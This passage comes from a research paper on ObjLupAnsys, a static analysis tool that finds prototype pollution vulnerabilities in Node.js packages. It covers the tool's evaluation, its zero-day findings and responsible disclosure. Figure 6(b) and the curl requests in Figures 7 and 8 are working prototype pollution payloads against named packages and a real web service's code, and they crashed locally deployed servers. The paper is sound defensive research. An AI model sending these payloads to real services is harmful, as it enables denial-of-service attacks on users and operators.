ObjLupAnsys attempts to assign the value of bina[b]to
decrease the distance, i.e., the number of property edges, be-
tween the object that a[b]represents and built-in objects like
Object.prototype.toString inOPG. Here is thedetailed proce-
dure.Specifically, ObjLupAnsys firstlooksup btofinditsobject
node.Then, ObjLupAnsys analyzesallthepropertiesof aandfinds
thosethatcandecreasethedistance.Next, ObjLupAnsys creates
dataflowedges(∗− →)betweentheobjectthat bpointstoandthose
273DetectingNode.js Prototype PollutionVulnerabilities viaObjectLookup Analysis ESEC/FSE ’21, August 23–28, 2021,Athens,Greece
properties of a. Note that before creating dataflow edges, ObjLu-
pAnsyswill check whether all the constraints are satisfiable as
describedinSection 3.4.3and3.3.1.
3.4.3 ConditionsAttachedtoVulnerableObjectLookup. Inthispart,
we describe OPG edges that are created due to the aforementioned
vulnerableobjectlookupinsourceorsinkclusterexpansion.For
example, when a statement is res=a[b] orres=a[b]+str ,ObjLu-
pAnsyswill create corresponding name →object or dataflow edge.
Theseedgesareconditional:Theconditionisthatthereexistthe
dataflowscreatedinclusterexpansion,e.g., bobj∗− →__proto__ name
inthe sink clusterexpansion.
Therearetwothingsworthnotinghere.First,theseconditions
are transferrable, i.e., when conditional edges are used to create
future edges, these edges are also attached with conditions. For
example, when the aforementioned resis used in tmp=res, the
name→object edge for the tmpnode is also attached with the
samecondition.Second, ObjLupAnsys maycreatemore thanone
paralleledgewithdifferentconditionsduringsinkclusterexpan-
sion. For example, there are two alternative object lookup paths
to reach a system built-in function for the example in Figure 1.
Therefore, the name node apoints to two different object nodes,
config.__proto__ andconfig.constructor , with different con-
ditions. Note that the latter is not shown in Figure 2due to limited
space.
4 IMPLEMENTATION
We implemented an open-source prototype of ObjLupAnsys
and released it as this repository ( https://github.com/Song-Li/
ObjLupAnsys.git ).Ourimplementation has twomajorparts: 3,150
lines of JavaScript code and 5,843 lines of Python code. The
JavaScript code converts the AST produced by Esprima ( https:
//esprima.org )tothestructureadoptedby ObjLupAnsys andalso
modelsNode.jsbuilt-inobjectsandfunctions.ThePythoncodeis
our core implementation on abstract interpretation, OPG construc-
tion,vulnerableobjectlookups(includingsourceandsinkcluster
expansion), andcluster-basedtaint analysis.
5 SYSTEMEVALUATION
In this section, we describe the evaluation of ObjLupAnsys .
5.1 EvaluationMethodologies
We describe the general evaluation methodology of ObjLupAnsys .
5.1.1 Baseline Detectors:PPFuzzerandPPNoest. We compare Ob-
jLupAnsys with two baseline approaches, one dynamic and the
otherstatic,intheevaluation.First,thedynamicanalysistoolisthe
onlyexistingprototypepollutiondetectiontoolfromArteau[ 7]Ð
for brevity,we callthe toolPPFuzzerinthis paper.
Second, because there isnostatic analysis to detect prototype
pollution, we used the state-of-the-art taintanalysis on JavaScript,
calledNodest[ 36],andthenmodifiedNodesttodetectprototype
pollution vulnerability. The modified version is called PPNodest in
the paper. Since Nodest does not support OPG,we cannot migrate
our object lookup analysis for the detection of prototype pollution.
Instead, for a statement a[b]=c, if the base object a, the looked-
upproperty b,andtheassignedvalue carealltainted,PPNodestreportsaprototypepollutionvulnerability.Wealsouploadedour
implementationofPPNodestas asupplementary material.
Note that Nodest itself is closed source and we have to re-
implement it. We did contact the authors for their source code
butdidnotobtainitduetotheauthors’companyrule.Atthesame
time,wescheduledseveralconferencecallswiththeauthorsand
showedthem ourimplementation. The authors pointed outseveral
missingimplementationsandconfirmedthattherestiscorrectÐ
We then added the missing implementation following the authors’
suggestion.
5.1.2 ExperimentSetup. Alltheexperimentsareperformedona
serverwith192GB=6*32GBRDIMM2666MT/sDualRankmemory,
Intel®Xeon®E5-2690v4 2.6GHz, 35MCache, 9.60GT/sQPI, Turbo,
HT,14C/28T(135W)MaxMem2400MHz,and4*2TB7.2KRPM
SATA 6Gbps3.5inHot-plugHardDrive.
5.1.3 ResearchQuestions. Inthispart,wedescribefourresearch
questionsto be answeredinthe evaluation.
•RQ1: What are the TP, FP and FN of ObjLupAnsys on detecting
vulnerable Node.js packages?
•RQ2: Will Node.js applications or packages become indirectly
vulnerable dueto inclusionof avulnerable package?
•RQ3:Whatisthecodecoverageof ObjLupAnsys onanalyzing
Node.js packages?
•RQ4: Whatis performanceoverheadof ObjLupAnsys onanalyz-
ingNode.js packages?
5.2 RQ1: TP,FP andFN
In this subsection, we evaluate True Positive (TP), False Positive
(FP)andFalseNegative(FN)of ObjLupAnsys .Weadopttwobench-
marksfor the comparison.
•[NPM Benchmark] Popular packages crawled from the Node
Package Manager (NPM). Specifically, we crawled 48,162 NPM
packageswithover1,000weeklydownloadsonFebruary25,2020.
We mainly evaluate TP and FP using this benchmark due to the
lack of ground truth information in vulnerability distribution.
NotethatwechoosepopularNPMpackagesbecausetheytend
to be well maintained and used by many people, thus increasing
the impacts ofvulnerabilities.
•[CVEBenchmark]LegacyvulnerablepackagesfromCommon
Vulnerabilities and Exposures (CVE) database. Specifically, we
searchedtheCVEdatabaseforprototypepollutionvulnerabilities
andobtained52historically-vulnerablepackagesasabenchmark.
WemainlyevaluateTPandFNusingthisbenchmark,because
wehavegroundtruthinformationandtherearenosafepackages
in the benchmark. Note that this benchmark favors PPFuzzer
because manyexisting CVEsare foundbythe fuzzer.
5.2.1 ComparisonwithPPFuzzer. Table1showsthat ObjLupAnsys
found43morezero-dayvulnerabilitiesthanPPFuzzeronreal-world
NPMbenchmarkandeightmoreontheCVEbenchmark.Themain
reason is that vulnerable parts of packages may not be triggered
in dynamic analysis. We show a selective list of true positives in
Table2.
Therearetwothingsworthnotinghere.First,asageneraldraw-
back of static analysis, ObjLupAnsys also produces more false
positives (FPs) than PPFuzzer. The true vs. false positive rate of
274ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
Table 1: True Positive, False Positive and False Negative of
ObjLupAnsys and PPFuzzer from Arteau [ 7] on two bench-
marks.
NameReal-worldNPM Packages LegacyCVE Packages
TP FP TP FN
PPFuzzer 18 0 32 20
PPNodest 3 3 6 46
ObjLupAnsys (branch-insensitive) 38 14 28 24
ObjLupAnsys (branch-sensitive) 61 20 40 12
ObjLupAnsys (between 1:1 and 2:1) is on par with prior vulner-
ability detection tools [ 8,9,26,31,52]. The major reason for FPs
isthatthereareunmodelledconstraintsbetweenobjectproperty
lookupandthevalueassignment.Forexample,onepackageadopts
Object.keys to iterate all the keys under the current object and
avoid a prototype chain lookup. Second, ObjLupAnsys still has
some FNs and we describe two main reasons below.(i) Due tothe
largenumberofallbuilt-infunctions,somefunctionsmaynotbe
modeledin ObjLupAnsys .(ii)Somepackages,e.g., lodash,arevery
largeand ObjLupAnsys willtimeoutwithoutfinishingtheabstract
interpretationafter thirtyseconds.
5.2.2 Comparison with PPNodest, a static analysis detector created
from Nodest. Table1also shows that ObjLupAnsys finds much
more vulnerabilities than PPNodest on both benchmarks. The rea-
sons are described below. First, TAJS, the abstract interpretation
toolthatPPNodestandNodestrelyon,isbranch-insensitive.There-
fore,PPNodestfailstodetectmanyzero-dayvulnerabilitiesinan
ifstatement, like our motivating example. Second, TAJS does not
support many ES6 features, such as arrow function, which also
contributessomefailedanalysis.
Table1also shows that the false positive rate of PPNodest is
high. The reason is that PPNodest does not support source and
sinkclusterexpansion,whichcannotcapturethecomplexobject
structure in both the source and the sink and propagate taints.
Instead, traditional taint analysis has to report many impossible
cases,such as a[p][p].
5.2.3 Branch Sensitivity. The last row of Table 1shows the im-
portance of branch sensitivity in detecting prototype pollution
vulnerabilities. Specifically, we switch off branch sensitivity in Ob-
jLupAnsys and show that this version of ObjLupAnsys detects
significantlyfewervulnerabilities.Thebranch-insensitive ObjLu-
pAnsysdetects 23 fewer vulnerabilities on the NPM packages and
12 fewer onthe CVEbenchmark.
5.2.4 ACaseStudyonTruePositive. Inthissubsection,weillustrate
onevulnerablepackageasanexampletoillustratezero-dayvulner-
abilities found by ObjLupAnsys . Specifically, dot-object is a pop-
ularutilitypackagewithmorethan100Kweeklydownloads,which
transforms Javascript objects using dot notation. The developer
fixedthevulnerablecodeafterwereportedthevulnerabilitytothem.
Figure6(a) shows simplified version of the vulnerable code and
Figure6(b) the corresponding exploit code. Specifically, at Line 10
of (a),keyequals to __proto__ ,kequals to toString andval[k]
equalsto "exploit" .Therefore, Object.prototype.toString is
pollutedto anotherstring.(a)Vulnerablecode:
1module.exports.set = function (path, val, obj, merge) {
2vari, k, keys, key;
3keys = parsePath(path, '.');
4for (i = 0; i < keys.length; i++) {
5key = keys[i];
6if(i === keys.length - 1) {
7 if(merge) {
8 for (k inval) {
9 if(hasOwnProperty.call(val, k)) {
10 obj[key][k] = val[k];
11 }
12 }
13 }
14}
15...
16}
17return obj;
18}
(b)Exploit:
1vara = require( "dot-object" );
2varpath = "__proto__" ;
3varval = {toString: "exploit" };
4a.set(path,val,{}, true);
Figure6:Aprototypepollutionvulnerabilityanditsexploit
codefordot-object(CVE-2019-10793).
5.3 RQ2: IndirectlyVulnerable Applicationsor
Packages
In this subsection, we answer the question whether safe Node.js
packagesbecomevulnerableandexploitableduetoinclusionofvul-
nerablepackages.Specifically,thevulnerablefunctionofadirectly-
vulnerablepackageisusedinanotherpackageandtheparameter
related to the vulnerability is controllable by the adversary, e.g.,
alsobeingexported.Then,thosepackagesaredefinedasindirectly-
vulnerablepackagesinthepaper.Ourmethodologyisasfollows.
First, we find packages orapplications that have a dependency on
the vulnerable packages found by ObjLupAnsys . We find them by
searching in both NPM and Github. Second, we run ObjLupAnsys
onthecombinationofthetargetandvulnerablepackagesandde-
cidewhether thecombinationisvulnerable.Lastly,wemanually
generate exploits for the target package together with the vulnera-
bleone.
Here are the results. ObjLupAnsys detects seven packages as
indirectly vulnerable and then our manual verification confirms
them as exploitable as shown in Table 3. Next, we illustrate two ex-
amplesasacasestudyonhowtoexploitthoseindirectly-vulnerable
packages.
5.3.1 CaseStudies. Inthissubsection,wegivetwocasestudieson
end-to-endvulnerable Node.js applications.
•Avulnerablewebsite. http://jsonbin.org ishostingapersonal
RESTfulAPIserviceandthesourcecodeofthewebsiteisat https:
//github.com/remy/jsonbin . The website adopts undefsafe , a
packagewithaprototypepollutionvulnerabilityfoundby Ob-
jLupAnsys . We found this website via searching the keyword,
undefsafe ,ongithub.Asaproofofconcept,wedownloadedthe
githubrepositoryanddeployedthewebsitelocallyforattackÐ
Note that, due to ethics concerns, we cannot attack the online
website directly.
275DetectingNode.js Prototype PollutionVulnerabilities viaObjectLookup Analysis ESEC/FSE ’21, August 23–28, 2021,Athens,Greece
Table 2: A selective list of zero-day vulnerabilities found by ObjLupAnsys (weekly download data is a snapshot of August 23,
2020).
Node.js Package LoC WeeklyDownload Vulnerable Version Location CVE# Patched
undefsafe 96 2,532,740 2.0.2 lib/undefsafe.js (Line106) CVE-2019-10795 Yes
append-field 123 1,301,874 1.0.0 lib/set-value.js (Line14) N/A No
graphql-anywhere 953 386,530 4.2.6 /lib/bundle.cjs.js(Line141) N/A No
aws-xray-sdk-core 6,967 187,901 2.5.0 subsegment.js(Line161) N/A No
cli-table-redemption 427 178,822 1.0.1 lib/utils.js(Line64) N/A No
dot-object 4,216 109,419 2.1.2 index.js(Line415) CVE-2019-10793 Yes
fastest-validator 2,265 28,811 1.0.2 lib/helpers/deep-extend.js(Line7) N/A No
protractor-jasmine2-html-reporter 5,192 23,158 0.0.7 index.js(Line28) N/A No
@progress/kendo-angular-charts 98,259 12,060 4.1.3 configuration.service.js (Line55) N/A No
eivindfjeldstad-dot 40 11,511 0.0.1 index.js(Line20) CVE-2020-7639 No
i18next-sync-fs-backend 13,178 7,235 1.1.1 lib/utils.js (Line60) N/A No
mathjax-full 61,009 4,621 3.0.1 js/components/global.js (Line27) N/A No
component-flatten 2,464 2,268 1.0.1 index.js(Line56) CVE-2019-10794 No
paypal-adaptive 197 1,890 0.4.2 lib/paypal-adaptive.js (Line31) CVE-2020-7643 No
querymen 496 1,838 2.1.3 dist/index.js(Line42) CVE-2020-7600 Yes
bodymen 281 1,433 1.1.0 dist/index.js(Line43) CVE-2019-10792 Yes
ini-parser 30 1,139 0.0.2 index.js(Line14) CVE-2020-7617 No
Table 3:Indirectly-vulnerable Applications/Packages.
Vulnerable Package Indirectly-vulnerable Applications/Packages
undefsafe http://jsonbin.org
dset design-system-utils(1.5.0), weoptions (0.0.11), quaff(4.2.0)
just-safe-set magasin (0.2.2)
object-set node-architect (0.0.15)
simple-odata-server thedefaultserver [ 3]for thepackage
curl -X POST http: //localhost:8100/test/test
-H'authorization: token xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxx xxxxx
'
-d'{ }'
curl -X PATCH http: //localhost:8100/test/test
-H'authorization: token xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxx xxxxx
'
-d'{ "__proto__": { "toString" : "abc"} }'
Figure7:Exploitcodethatleadstoadenial-of-serviceattack
on a local copy of a real-world website (http://jsonbin.org),
which hosts apersonal RESTful APIservice.
curl -d '{"constructor": {"prototype": {"toString": "exploited "}}}
'-H"Content-Type: application/json" -X POST http: //
localhost:1337/users
Figure8:Exploitcodethatleadstoadenial-of-serviceattack
on simple-odata-server.
The result is that we successfully launched a denial of service
attack to any users of the service by crashing the local server
withtheexploitcodeinFigure 7.Followinguponoursuccessful
attack, we have disclosed it to the website owner and are still
waiting for aresponse.
•Avulnerableservercode. simple-odata-server isanimple-
mentation OData server running on Node.js with adapters for
mongodbandnedb.Wedeployedthedefaultserver[ 3]coming
with the Node.js package locally at port 1337 and successfully
exploited the server with exploit code as shown in Figure 8. The
server crashes after exploitation, leading to a denial-of-server
consequence. 0 10 20 30 40 50 60 70
0
0-1010-20 20-30 30-40 40-50 50-60 60-70 70-80 80-9090-100Percentage of Packages[%]
Coverage[%]PPFuzzer
ObjLupAnsys
PPNodest
Figure 9: Statement coverage distribution of ObjLupAnsys ,
PPFuzzer and PPNodest (timeout: 30 seconds). One major
reasonofuncoveredcodein ObjLupAnsys issomedeadcode
(e.g., uninvoked functions ordeadbranching statement).
5.4 RQ3: CodeCoverage
In this subsection, we evaluate the code coverage of ObjLupAnsys
intermsofstatementcoverageandcompareitwithPPFuzzer[ 7]
and PPNodest. Specifically, statement coverage defines the percent-
age ofstatements that are abstractly interpreted by ObjLupAnsys
orexecutedbyPPFuzzer.Wemeasurestatementcoverageof Ob-
jLupAnsys or PPNodest directly during abstract interpretation and
adoptIstanbul/nyc[ 2]together withmocha[ 6] for measuringPP-
Fuzzer’s coverage. Now, we show the cumulative distribution of
statementcoveragesinFigure 9:Themediancoverageof ObjLu-
pAnsysis 71.9% as opposed to 28.0% for PPFuzzer and 19.0% for
PPNodest. The reason for the low coverage of PPFuzzer is that
PPFuzzerisadynamictool,whichcanonlycoverabranchingstate-
ment when the branching condition is satisfied. The reason for the
low coverage of PPNodest is that PPNodest cannot exhaustively
find all the entry points and it stops abstract interpretation if an
unimplementedfunction isencountered.
Notethatthe coveragesof ObjLupAnsys insomepackages are
alsorelativelylow.Therearethreemajorreasons.(i)Somefunctions
aredeadcode,whicharenevercalledfromtheentryfunction(ii)
276ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
 0 10 20 30 40 50 60 70 80 90 100
 0  5  10  15  20  25  30Percentage of finished packages [%]
Time [s]Branch-sensitive ObjLupAnsys
Branch-insensitive ObjLupAnsys
PPNodest
Figure 10:CDFgraphoftotal analysis time.
SomebranchingstatementconditionswillneverbesatisfiedÐwhen
ObjLupAnsys candecidethebranchingconditionstatically, ObjLu-
pAnsyswillsmartlyskipthedeadbranch.Notethisandtheformer
are both probably because the developer copies and pastes code
from somewhere else. (iii) Some files included via require contain
variablesfromapackageinputÐ ObjLupAnsys cannotresolvethese
variables withoutconcrete inputs.
5.5 RQ4: Performance
In this subsection, we evaluate the performance in terms of how
fastObjLupAnsys andPPNodestcanfinishanalyzingNode.jspack-
agesontheNPMbenchmark.Figure 10showsaCDFgraphwith
30secondsasthetime-outthreshold: ObjLupAnsys finishesana-
lyzing85%ofpackageswithin30secondswithbranchsensitivity
and 90% without branch sensitivity. The performance of branch-
insensitive ObjLupAnsys is similar to PPNodest, which is also a
branch-insensitive static analysis. PPNodest needs additional time
to compute control flows and that is why it does not finish any
packages inthe firstfive seconds.
6 DISCUSSION
Responsible Disclosure. We have responsibly disclosed allthe vul-
nerabilities found by ObjLupAnsys to their developers together
with Proof of Vulnerability (PoV) and will not release those vulner-
abilities before a 60-day window. If the developers ask us for more
time for patching, we will also wait for their patches before public
release.
Loop Execution and Recursive Call. ObjLupAnsys executes a loop
orarecursivecallextensivelyuntilnomorenewobjectsoutsidethe
loop or recursive call become tainted in the object-level, prototype-
orientedtaint analysis.
ArrayHandling. Arraysarehandledsimilartoobjectsin ObjLu-
pAnsys, because an array is essentially a special type of objects
representedinJavaScript,inwhichindexesarethepropertynames.
Manyarrayoperations,suchaspushandpop,mayintroduceambi-
guitiesespeciallywhenwedonotknowthenumberofelementsin
the array.Dynamic Code. JavaScript code can be introduced dynamically
viaevalandnewFunction.Ifthosedynamiccodeareknown, Ob-
jLupAnsys parses and abstractly interprets the code. If part of the
dynamiccodeisunknown, ObjLupAnsys willadoptthetemplate
approach adoptedbyCSPAutoGen[ 38].
Implementation of JavaScript features. We investigated randomly-
selected 10k Node.js packages on NPM and implemented all the
features(basedonASTnodetypeoutputtedbyEsprima)thatare
used by more than 5% ofpackages. Specifically,thecurrentimple-
mentation of ObjLupAnsys supports all ES5 features except for
łwithž,whichisusedbylessthan1%ofNode.jspackagesanddepre-
cated in the strict mode of JavaScript. The support beyond ES5 (i.e.,
ES2015andplus)isstilldeveloping:Currently, ObjLupAnsys sup-
portsPromise(includingawaitandyield),arrowfunction,template
literals, and template element. Note that although ObjLupAnsys
doesnotsupportsomeES2015features,e.g.,classandextends,it
can be combined with Babel ( https://babeljs.io/ ) to convert ES2015
andplusfeatures to be ES5compatible for analysis.
Asynchronous Callbacks and Events. The current implementation
ofObjLupAnsys puts asynchronous callbacks in a queue during
registration and then invokes them after ObjLupAnsys finishes
executingthecurrententryfunction.Inmanycases,thisisjustone
ofmanypossibilitiesinexecutingasynchronouscallbacksÐwewill
leave this as a future work to model them as an event-based call
graph like Madsenetal.[ 32].
7 RELATED WORK
Inthissection,wediscussrelatedwork.Westartfromdescribing
security works on Node.js platform, and then present client-side
JavaScriptsecurity.Lastly,wepresentgeneralvulnerabilitydetec-
tionwork onotherplatforms.
Node.jsSecurity. Manyresearchworkshavebeenproposedtostudy
thesecurityofNode.jsplatformonavarietytypesofvulnerabilities
and we describe them separately below. For example, Ojamaa et
al. [37] and Nodest [ 36] proposed potential risks including com-
mand injection attack. SYNODE [ 46] adopts a rewriting technique
to enforce a template before executing a possible injection API like
eval. Arteau [ 7] proposes a fuzzer to execute Node.js package and
finds prototype pollution vulnerabilities. Then, the general issue of
path traversal has been studied for web applications [ 23,34] using
static or dynamic analysis. Next, researchers have studied Node.js-
specificDenialofService(DoS)attacks,suchasRegularExpression
DoS (ReDoS) [ 45] and Event Handler Poisoning (EHP) [ 17]. The
binding layers of the Node.js also have vulnerabilities [ 10]. Conflic-
tJS [39] analyzed conflicts among different JavaScript libraries and
Zimmermannetal. [ 54] studiedtherobustnessof asmallnumber
ofthird-partyNode.jspackagestoinfluencethesecurityofother
packages.
As a comparison, prototype pollution is specific to JavaScript
due to dynamic features of JavaScript, i.e., prior works on other
vulnerabilities cannot detect prototype pollution. Arteau [ 7] is the
first work that detects prototype pollution, but misses many vul-
nerabilities because it is a dynamic analysis tool with limited code
coverage. DAPP [ 28] mostly adopts Abstract Syntax Tree (AST)
and control-flow features as simple detection patterns of prototype
277DetectingNode.js Prototype PollutionVulnerabilities viaObjectLookup Analysis ESEC/FSE ’21, August 23–28, 2021,Athens,Greece
pollutionvulnerabilitydetection,whichleadstohighfalsepositives
andnegatives (>50%inboth cases).
Client-sideJavaScriptSecurity. Researchershavealsostudiedclient-
side JavaScript security in addition to the server side. For example,
Cross-sitescripting(XSS)[ 15,29,35,48ś50]andCross-SiteScript
Inclusionattack(XSSI)[ 30]attacksarewellstudiedontheclient
side.Manyresearchworks,suchasHideNoSeek [ 18],JShield[ 13]
and JSTap [ 19], have been proposed to detect or analyze malicious
JavaScriptcode.ResearchershavealsoproposedtosecureJavaScript
using security policies with works, such as GateKeeper [ 21] and
CSPAutoGen[ 38].Programanalysis[ 41,47]havealsobeenadopted
at the client side for security analysis. Many prior works [ 5,11,
12,14,16,20,33,40] have been proposed to restrict JavaScript,
especially those from third-party, ina subset for security. It worth
noting that object property graph (OPG) can also be applied to
analyze client-sideJavaScript code but isleft as afuture work.
Error Analysis of JavaScript Programs. Prior works have proposed
todetect commonerrors that developers maymake when writing
JavaScript programs. For example, both TAJS [ 25] and JSAI [ 27]
adopt abstract interpretation to analyze JavaScript programs for
moreaccuratecallgraphgenerationandthendetecttype-related
errors. Madsen et al. [ 32] propose event-based call graph to detect
problemsreportedonStackOverflow.Asacomparison,noneofthe
aforementionedworkscandetectprototypepollutionvulnerabil-
itieslikethosetargetedinthispaperduetothelackofmodeling
interplaysbetween objects.
OtherGraph-representationofJavaScriptObjects. Priorworkshave
alsousedgraphstructurestorepresentJavaScriptobjects.Forex-
ample, the heap graph proposed by Guarnieri et al. [ 22] models
local object relations. However, Guarnieri et al. do not simulate
JavaScript execution via abstract interpretation like TAJS [ 25] and
JSAI [27], which leads to the lack of runtime states, e.g., scopes, in
the graph. Therefore, object resolution related to runtime states,
e.g.,parametersoftwoseparateexecutionsofthesamefunction,are
inevitablyapproximated.Inaddition,JavaScriptfunctionsarenot
represented as objects in the heap graph, leading to another object
resolution approximation. Brave’s PageGraph [ 1] and its predeces-
sor AdGraph [ 24] model the relations between different browser
objects like scripts, DOM and AJAX during runtime with concrete
inputs. As a comparison, ObjLupAnsys models fine-grained re-
lations between JavaScript objects without any concrete inputs,
whichare not inPageGraph orAdsGraph.
GeneralVulnerabilityAnalysisFramework. CodePropertyGraph
(CPG)isproposedbyYamaguchietal.[ 52]asageneralframework
combining CFG, DFG, and AST to detect C/C++ vulnerabilities.
Lateron,CPGisportedtoPHPbyBackesetal.[ 9]asanopen-source
toolcalledphpjoern[ 4].Inthepast,codeanalysis[ 31,43,44,53]has
been also widely used to detect various vulnerabilities on different
platforms. The concept of objects and relations between object
arealsoadoptedintraditionalprogramanalysisanddefenses[ 42,
51],suchasObjectFlowIntegrity[ 51].Theconceptsofobjectsin
JavaScriptaredifferentfromthoseonC/C++duetotheexistenceof
prototypeandruntimeresolution,whichmakestraditionalobject
analysisnot applicable onJavaScript.8 CONCLUSION
Dynamic,flexibleJavaScriptfeaturesnotonlybringconvenience
to web developers, but also introduce new vulnerabilities like pro-
totype pollution. In this paper, we propose Object Property Graph
(OPG) to capture the interplays of JavaScript objects via abstract
interpretation and design a framework, called ObjLupAnsys , to
facilitate object lookup analysis and detect prototype pollution
vulnerabilities. ObjLupAnsys finds 61 previously-unknown vulner-
abilities with 11 CVEs and also detects seven indirectly-vulnerable
Node.js applications or packages due to the inclusion of vulnerable
packages.Wehaveresponsiblyreportedallthevulnerabilitiesto
theirdevelopers andfive have already been fixed.
ACKNOWLEDGMENTS
Wewouldliketothankanonymousreviewersfortheirhelpfulcom-
ments and feedback. This work was supported in part by National
Science Foundation (NSF) under grants CNS-20-46361 and CNS-18-
54001and DefenseAdvancedResearch ProjectsAgency (DARPA)
under AFRL Definitive Contract FA875019C0006. The views and
conclusionscontainedhereinarethoseoftheauthorsandshould
notbeinterpretedasnecessarilyrepresentingtheofficialpolicies
orendorsements,eitherexpressedorimplied,of NSF orDARPA.
REFERENCES
[1][n.d.]. Brave PageGraph. https://github.com/brave/brave-browser/wiki/
PageGraph .
[2][n.d.].Istanbul’sstateoftheartcommandlineinterface .https://www.npmjs.com/
package/nyc .
[3][n.d.].Node simple OData server .https://github.com/pofider/node-simple-odata-
server.
[4][n.d.].ParserutilitytogenerateASTsfromPHPsourcecodesuitabletobeprocessed
by Joern.https://github.com/malteskoruppa/phpjoern .
[5] [n.d.]. SES.https://github.com/tc39/proposal-ses .
[6][n.d.].Simple, flexible, fun JavaScript test framework for Node.js and The Browser .
https://www.npmjs.com/package/mocha .
[7]Olivier Arteau. 2018. Prototype Pollution Attackin NodeJS Application. North-
Sec.
[8]Steven Arzt, Siegfried Rasthofer, Christian Fritz, Eric Bodden, Alexandre Bar-
tel,JacquesKlein,YvesLeTraon,DamienOcteau,andPatrickMcDaniel.2014.
Flowdroid: Precise context, flow, field, object-sensitive and lifecycle-aware taint
analysisforandroidapps.In Proceedingsofthe35thACMSIGPLANConference
onProgrammingLanguage Designand Implementation . ACM,29.
[9]MichaelBackes,KonradRieck,MalteSkoruppa,BenStock,andFabianYamaguchi.
2017. Efficient andflexiblediscoveryof PHPapplicationvulnerabilities. In 2017
IEEE european symposiumonsecurityand privacy(EuroS&P) . IEEE,334ś349.
[10]FraserBrown,ShravanNarayan,RiadSWahby,DawsonEngler,RanjitJhala,and
DeianStefan. 2017. Findingand preventingbugs injavascript bindings.In 2017
IEEE SymposiumonSecurityand Privacy (SP) . IEEE,559ś578.
[11]YinzhiCao,ZhichunLi,VaibhavRastogi,andYanChen.2010. Virtualbrowser:a
web-level sandboxto secure third-partyJavaScript without sacrificing function-
ality.InProceedingsofthe17thACMconferenceonComputerandcommunications
security. 654ś656.
[12]YinzhiCao,ZhichunLi,VaibhavRastogi,YanChen,andXitaoWen.2012. Virtual
browser: a virtualized browser to sandbox third-party javascripts with enhanced
security.In Proceedingsofthe7thACMSymposiumonInformation,Computerand
Communications Security . 8ś9.
[13]YinzhiCao,XiangPan,YanChen,andJianweiZhuge.2014. JShield:towardsreal-
time and vulnerability-based detection of polluted drive-by download attacks. In
Proceedings of the 30th Annual Computer Security Applications Conference . ACM,
466ś475.
[14]YinzhiCao,VaibhavRastogi,ZhichunLi,YanChen,andAlexMoshchuk.2013.
RedefiningWeb Browser Principalswitha ConfigurableOriginPolicy.In DSN.
[15]YinzhiCao,ChaoYang,VaibhavRastogi,YanChen,andGuofeiGu.2014. Abusing
browseraddressbarforfunandprofit-anempiricalinvestigationofadd-oncross
site scripting attacks. In International Conference on Security and Privacy in
Communication Networks . Springer, 582ś601.
[16]ZhanhaoChenandYinzhiCao.2020. JSKernel:FortifyingJavaScriptagainstWeb
Concurrency Attacks via a Kernel-Like Structure. In 2020 50th Annual IEEE/IFIP
278ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
InternationalConferenceonDependableSystemsandNetworks(DSN) .64ś75.https:
//doi.org/10.1109/DSN48063.2020.00026
[17]James C Davis, Eric R Williamson, and Dongyoon Lee. 2018. A sense of time for
JavaScript and Node.js: first-class timeouts as a cure for event handler poisoning.
In27th{USENIX}SecuritySymposium( {USENIX}Security18) . 343ś359.
[18]AuroreFass,MichaelBackes,andBenStock.2019. Hidenoseek:Camouflaging
malicious javascript in benign asts. In Proceedings of the 2019 ACM SIGSAC
Conference onComputer and Communications Security . 1899ś1913.
[19]Aurore Fass, Michael Backes, and Ben Stock. 2019. JStap: A Static Pre-Filter
forMaliciousJavaScriptDetection.In Proceedingsofthe35thAnnualComputer
SecurityApplicationsConference (SanJuan,PuertoRico) (ACSAC’19) .Association
for Computing Machinery, New York, NY, USA, 257ś269. https://doi.org/10.
1145/3359789.3359813
[20] Google. [n.d.]. GoogleCaja .http://code.google.com/p/google-caja/ .
[21]SalvatoreGuarnieriandBenjaminLivshits.2009. GATEKEEPER:MostlyStatic
Enforcementof Security and ReliabilityPoliciesforJavaScriptCode.In USENIX
Security.
[22]SalvatoreGuarnieri,MarcoPistoia,OmerTripp,JulianDolby,StephenTeilhet,
and Ryan Berg. 2011. Saving the world wide web from vulnerable JavaScript. In
Proceedings of the 2011 International Symposium on Software Testing and Analysis .
177ś187.
[23]Hossein Homaei and Hamid Reza Shahriari. 2017. Seven years of software
vulnerabilities: The ebband flow. IEEE Security& Privacy 15,1 (2017), 58ś65.
[24]Umar Iqbal, Peter Snyder, Shitong Zhu, Benjamin Livshits, Zhiyun Qian, and
Zubair Shafiq. 2020. AdGraph: A Graph-Based Approach to Ad and Tracker
Blocking. In IEEE SymposiumonSecurityand Privacy .
[25]SimonHolmJensen,AndersMùller,andPeterThiemann.2009. Typeanalysis
for JavaScript.In InternationalStatic AnalysisSymposium . Springer, 238ś255.
[26]NenadJovanovic,ChristopherKruegel,andEnginKirda.2006. Pixy:Astaticanal-
ysistoolfordetectingwebapplicationvulnerabilities.In 2006IEEESymposium
onSecurityand Privacy (S&P’06) . IEEE,6śpp.
[27]VineethKashyap,KyleDewey,EthanAKuefner,JohnWagner,KevinGibbons,
JohnSarracino,BenWiedermann,andBenHardekopf.2014.JSAI:astaticanalysis
platformforJavaScript.In Proceedingsofthe22ndACMSIGSOFTinternational
symposiumonFoundationsofSoftwareEngineering . 121ś132.
[28]HeeYeonKim,JiHoonKim,HoKyunOh,BeomJinLee,SiWooMun,JeongHoon
Shin, and Kyounggon Kim. 2021. DAPP: automatic detection and analysis of
prototypepollutionvulnerabilityinNode.jsmodules. InternationalJournalof
InformationSecurity (2021), 1ś23.
[29]Sebastian Lekies, Ben Stock, and Martin Johns. 2013. 25 million flows later:
Large-scaledetectionofDOM-basedXSS.In Proceedingsofthe2013ACMSIGSAC
conference onComputer & communicationssecurity . 1193ś1204.
[30]Sebastian Lekies, Ben Stock, Martin Wentzel, and Martin Johns. 2015. The
unexpecteddangersofdynamicjavascript.In 24th{USENIX}SecuritySymposium
({USENIX}Security15) . 723ś735.
[31]VBenjaminLivshitsandMonicaSLam.2005. FindingSecurityVulnerabilitiesin
JavaApplications with Static Analysis..In USENIXSecurity .
[32]MagnusMadsen,FrankTip,andOndřejLhoták.2015. Staticanalysisofevent-
